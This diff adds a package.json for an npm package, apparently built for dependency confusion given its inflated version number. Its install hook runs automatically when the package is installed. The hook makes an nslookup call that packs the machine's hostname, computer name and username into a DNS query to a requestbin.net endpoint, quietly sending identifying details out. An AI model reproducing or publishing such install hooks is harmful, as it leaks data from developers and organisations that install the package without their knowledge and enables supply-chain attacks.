@@ -1,0 +1,11 @@
+{
+  "name": "ajay-kulal4",
+  "version": "200.0.6",
+  "description": "ajay-kulal4: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.ajay-kulal4.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
